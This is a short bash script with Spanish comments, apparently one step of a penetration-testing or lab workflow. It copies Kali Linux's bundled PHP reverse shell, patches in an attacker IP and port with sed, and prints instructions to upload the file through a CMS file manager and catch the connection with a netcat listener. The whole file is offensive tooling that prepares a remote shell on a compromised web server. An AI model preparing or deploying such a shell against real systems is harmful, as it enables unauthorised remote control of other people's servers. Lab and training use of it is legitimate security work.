#!/usr/bin/env bash
#
# 03_prepare_reverse_shell.sh
# Prepara una copia local del php-reverse-shell.php incluido por
# defecto en Kali Linux, sustituyendo la IP y el puerto de escucha
# por los del atacante. NO genera el payload desde cero: solo
# automatiza la copia y el parcheo de variables sobre el script
# ya presente en el sistema (paquete "webshells" de Kali).
#
# Uso:
#   ./03_prepare_reverse_shell.sh <IP_atacante> <puerto> [salida.php]
#
# Ejemplo:
#   ./03_prepare_reverse_shell.sh 10.0.2.14 4444 shell.php
#
set -euo pipefail

SRC="/usr/share/webshells/php/php-reverse-shell.php"
IP="${1:?Uso: $0 <IP_atacante> <puerto> [salida.php]}"
PORT="${2:?Uso: $0 <IP_atacante> <puerto> [salida.php]}"
OUT="${3:-shell.php}"

if [[ ! -f "${SRC}" ]]; then
  echo "[!] No se encontró ${SRC}."
  echo "    Instálalo con: sudo apt install webshells"
  exit 1
fi

cp "${SRC}" "${OUT}"
sed -i "s/\$ip = .*/\$ip = '${IP}';/" "${OUT}"
sed -i "s/\$port = .*/\$port = ${PORT};/" "${OUT}"

echo "[+] Shell preparada en ${OUT} (IP=${IP} PORT=${PORT})"
echo "[*] Súbela vía el gestor de archivos del CMS y ponte a la escucha con:"
echo "      sudo nc -lnv ${PORT}"
